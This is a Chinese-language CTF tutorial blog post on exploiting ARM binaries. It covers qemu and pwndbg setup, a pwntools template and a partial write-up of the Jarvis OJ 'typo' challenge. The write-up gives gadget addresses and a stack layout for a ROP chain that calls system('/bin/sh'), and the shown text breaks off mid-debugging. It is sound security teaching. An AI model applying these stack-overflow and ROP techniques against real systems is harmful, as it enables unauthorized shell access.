<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>如何 pwn 掉一个 arm 的binary - localhost - Done with development, it&#39;s time to pwn.</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="M4x" />
  <meta name="description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0" />







<meta name="generator" content="Hugo 0.48" />


<link rel="canonical" href="https://bash-c.github.io/post/arm_pwn/" />



<link rel="icon" href="/favicon.ico" />










<link href="/dist/jane.min.css?v=2.7.0" rel="stylesheet">




<meta property="og:title" content="如何 pwn 掉一个 arm 的binary" />
<meta property="og:description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bash-c.github.io/post/arm_pwn/" /><meta property="article:published_time" content="2018-07-31T20:00:54&#43;08:00"/>
<meta property="article:modified_time" content="2018-07-31T20:00:54&#43;08:00"/>
<meta itemprop="name" content="如何 pwn 掉一个 arm 的binary">
<meta itemprop="description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0">


<meta itemprop="datePublished" content="2018-07-31T20:00:54&#43;08:00" />
<meta itemprop="dateModified" content="2018-07-31T20:00:54&#43;08:00" />
<meta itemprop="wordCount" content="3027">



<meta itemprop="keywords" content="arm,pwn," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="如何 pwn 掉一个 arm 的binary"/>
<meta name="twitter:description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">localhost</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">cat /friends</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          
        
      </li>
    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      localhost
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">cat /friends</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          

        

      </li>
    
    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">如何 pwn 掉一个 arm 的binary</h1>
      
      <div class="post-meta">
        <span class="post-time"> 2018-07-31 </span>
        <div class="post-category">
            <a href="https://bash-c.github.io/categories/how2/"> how2 </a>
            
          </div>
        <span class="more-meta"> 3027 words </span>
          <span class="more-meta"> 7 min read </span>

        
        
          <span id="busuanzi_container_page_pv">
            | 阅读 <span id="busuanzi_value_page_pv"></span>
          </span>
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#环境搭建">环境搭建</a>
<ul>
<li><a href="#主机信息">主机信息：</a></li>
<li><a href="#预备环境安装">预备环境安装：</a></li>
<li><a href="#安装qemu">安装qemu：</a></li>
<li><a href="#安装共享库">安装共享库：</a></li>
<li><a href="#运行">运行：</a></li>
<li><a href="#调试">调试：</a></li>
<li><a href="#效果图">效果图：</a></li>
<li><a href="#more">more：</a></li>
<li><a href="#reference">reference：</a></li>
</ul></li>
<li><a href="#运行和调试">运行和调试</a></li>
<li><a href="#arm-下的函数调用约定">arm 下的函数调用约定</a></li>
<li><a href="#jarvis-oj-typo">Jarvis oj - typo</a>
<ul>
<li><a href="#静态分析">静态分析</a></li>
<li><a href="#思路">思路</a></li>
<li><a href="#rop">ROP</a></li>
</ul></li>
<li><a href="#codegate2018-melong">Codegate2018 - melong</a>
<ul>
<li><a href="#静态分析-1">静态分析</a></li>
<li><a href="#思路分析">思路分析</a></li>
<li><a href="#exp">exp</a></li>
</ul></li>
<li><a href="#more-1">More</a></li>
<li><a href="#reference-1">Reference</a></li>
</ul></li>
</ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      

<p>这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题</p>

<h2 id="环境搭建">环境搭建</h2>

<p>环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来</p>

<hr />

<blockquote>
<p>原文链接<a href="http://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html">M4x@10.0.0.55</a>
本文中用于展示的binary分别来自Jarvis OJ上pwn的add，typo两道题</p>
</blockquote>

<p>写这篇教程的主要目的是因为最近想搞其他系统架构的 pwn，因此第一步就是搭建环境了，网上搜索了一波，发现很多教程都是需要树莓派，芯片等硬件，然后自己编译 gdb，后来实践的过程中发现可以很简单地使用 qemu 实现运行和调试异架构 binary，因此在这里分享一下我的方法。</p>

<h3 id="主机信息">主机信息：</h3>

<p>以一台新装的 deepin 虚拟机(基于 debian)为例，详细信息如下：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5av617a5j30lq0bu78m.jpg" alt="" /></p>

<h3 id="预备环境安装">预备环境安装：</h3>

<ul>
<li>安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get update
$ sudo apt-get install git gdb gdb-multiarch
$ sudo apt-get install <span class="s2">&#34;binfmt*&#34;</span></code></pre></td></tr></table>
</div>
</div>
<ul>
<li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件）</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pwndbg/pwndbg
$ <span class="nb">cd</span> pwndbg
$ ./setup.sh</code></pre></td></tr></table>
</div>
</div>
<p>装好之后如图：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5c1vzla8j30nb04t75m.jpg" alt="" /></p>

<ul>
<li>安装pwntools，不必要，但绝对是写exp的神器</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">  $ sudo pip install pwntools</code></pre></td></tr></table>
</div>
</div>
<h3 id="安装qemu">安装qemu：</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get install qemu-user</code></pre></td></tr></table>
</div>
</div>
<p>通过 qemu 模拟 arm/mips 环境，进而进行调试</p>

<h3 id="安装共享库">安装共享库：</h3>

<p>此时已经可以运行静态链接的 arm/mips binary 了，如下图：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5crjvp5dj31400p0ngj.jpg" alt="" /></p>

<p>但还不能运行动态链接的 binary，如下图：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5csjo38rj313o05i779.jpg" alt="" /></p>

<p>这就需要我们安装对应架构的共享库，可以通过如下命令搜索：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ apt-cache search <span class="s2">&#34;libc6&#34;</span> <span class="p">|</span> grep ARCH</code></pre></td></tr></table>
</div>
</div>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5cudid7gj30xy0h7trd.jpg" alt="" /></p>

<p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可</p>

<h3 id="运行">运行：</h3>

<p>静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p>

<p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，如下图32位的动态链接 mips binary</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d1guaxvj313m03bq55.jpg" alt="" /></p>

<p>使用 -L 指定共享库：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add</code></pre></td></tr></table>
</div>
</div>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d3xxmfqj30z50c4ahc.jpg" alt="" /></p>

<h3 id="调试">调试：</h3>

<p>可以使用 qemu 的 -g 指定端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -g <span class="m">1234</span> -L /usr/mipsel-linux-gnu/ ./add</code></pre></td></tr></table>
</div>
</div>
<p>然后使用gdb-multiarch进行调试，先指定架构，然后使用remote功能</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; <span class="nb">set</span> architecture mips <span class="o">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span class="o">)</span>
pwndbg&gt; target remote localhost:1234</code></pre></td></tr></table>
</div>
</div>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dbufgrjj31400p013o.jpg" alt="" /></p>

<p>这样我们就能进行调试了</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt="" /></p>

<h3 id="效果图">效果图：</h3>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt="" /></p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dg64kb8j31400p0tgd.jpg" alt="" /></p>

<h3 id="more">more：</h3>

<p>同样，如果想要运行或者调试其他架构的 binary，只需安装其他架构的 qemu 和共享库即可</p>

<h3 id="reference">reference：</h3>

<p><a href="https://docs.pwntools.com/en/stable/qemu.html">https://docs.pwntools.com/en/stable/qemu.html</a></p>

<p><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></p>

<hr />

<h2 id="运行和调试">运行和调试</h2>

<p>安装好 qemu 之后, 就可以在本地运行和调试 binary 了, 我写了一个模板:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;your_binary&#34;</span>

<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;remote_addr&#34;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;your_binary&#34;</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;your_binary&#34;</span><span class="p">])</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;your_binary&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span></code></pre></td></tr></table>
</div>
</div>
<p>说明一下:</p>

<ul>
<li>根据 pwntools 的 <a href="http://docs.pwntools.com/en/stable/context.html?highlight=context.binary#pwnlib-context-setting-runtime-variables">官方文档</a>, 使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数了</li>
</ul>

<blockquote>
<p>The recommended method is to use context.binary to automagically set all of the appropriate values.</p>
</blockquote>

<ul>
<li>python exp.py r 打远程</li>
<li>python exp.py l 本地测试</li>

<li><p>python exp.py d/a/b/&hellip; 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</p></li>

<li><p>这里只写了使用 arm-linux-gnueabi 的情况, 使用 arm-linux-gnueabihf 的话更改参数即可, 关于二者的区别可以参考这篇 <a href="https://www.cnblogs.com/xiaotlili/p/3306100.html">文章</a></p></li>
</ul>

<h2 id="arm-下的函数调用约定">arm 下的函数调用约定</h2>

<p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中</p>

<p>一图胜千言:</p>

<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="" /></p>

<p>by the way, arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转</p>

<p>接下来以几道题目为例进行分析</p>

<h2 id="jarvis-oj-typo">Jarvis oj - typo</h2>

<p><a href="https://github.com/0x01f/pwn_repo/tree/master/jarvisOJ_typo">题目和脚本链接</a></p>

<h3 id="静态分析">静态分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●<span class="o">]</span> check typo
typo: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/jarvisOJ_typo/typo&#39;</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE</code></pre></td></tr></table>
</div>
</div>
<p>32 位 arm 静态链接的程序, strip 过了, 并且没有开栈溢出保护, 因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ./typo
Let<span class="s1">&#39;s Do Some Typing Exercise~
</span><span class="s1">Press Enter to get start;
</span><span class="s1">Input ~ if you want to quit
</span><span class="s1">
</span><span class="s1">------Begin------
</span><span class="s1">inquiry
</span><span class="s1">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span class="s1">E.r.r.o.r.
</span><span class="s1">
</span><span class="s1">odour
</span><span class="s1">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span class="s1">qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock&#39;</span> failed.
qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion <span class="sb">`</span>!have_tb_lock<span class="err">&#39;</span> failed.
<span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">3426</span> segmentation fault  ./typo</code></pre></td></tr></table>
</div>
</div>
<h3 id="思路">思路</h3>

<p>运行一下发现是一个打字游戏, 很容易就找到了溢出点, 利用 rop chain 构造 system(&ldquo;/bin/sh&rdquo;) 即可, /bin/sh 的地址比较好找, 只要找到 system 的地址, 这个题目就很容易解决了</p>

<p>binary 去除了符号表信息, 并不是太容易看出来函数功能, 幸运的是通过在 IDA 中查看 /bin/sh 的交叉引用, 我们能找到调用 system 的函数(sub_10BA8 函数中出现了 /bin/sh, 读过 system 源码的同学可以发现该函数与 system 的流程类似, 于是大胆猜测 sun_10BA8 即为 system, 后来事实证明确实是)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">sub_110B4</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">sub_10BA8</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>                     <span class="c1">// system(a1)
</span><span class="c1"></span>  <span class="k">else</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">sub_10BA8</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="s">&#34;exit 0&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<hr />

<p>后来发现，使用 <code>rizzo</code> 可以恢复出 system 的符号表，这样寻找 system 的地址就很容易了</p>

<h3 id="rop">ROP</h3>

<p>这样我们只需要找一个能控制 r0 的 gadget 寄存器就行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --only <span class="s2">&#34;pop|ret&#34;</span> <span class="p">|</span> grep r0
0x00020904 : pop <span class="o">{</span>r0, r4, pc<span class="o">}</span>
jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh          
Strings <span class="nv">information</span>
<span class="o">============================================================</span>
0x0006c384 : /bin/sh</code></pre></td></tr></table>
</div>
</div>
<p>于是可以构造如下的栈结构</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></pre></td>
<td class="lntd">
<pre class="chroma">+------------+
|            |
|   padding  |
|            |
|            |
+------------+
| gadget_addr| &lt;- 0x20904
+------------+
| binsh_addr | &lt;- 0x6c384
+------------+
| junk_data  |
+------------+
| system_addr| &lt;- 0x100B4
+------------+</pre></td></tr></table>
</div>
</div>
<p>这样在程序返回时, 经过 rop 就会实现 r0 -&gt; &ldquo;/bin/sh&rdquo;, r4 -&gt; junk_data, pc = system_addr 的效果, 进而执行 system(&ldquo;/bin/sh&rdquo;) 来 get shell</p>

<p>此时还有一个问题, 不知道 padding 的长度, 可以通过 pwntools 的 cyclic/cyclic -l 来找长度</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; cyclic <span class="m">200</span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg&gt; c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? <span class="o">()</span>
LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
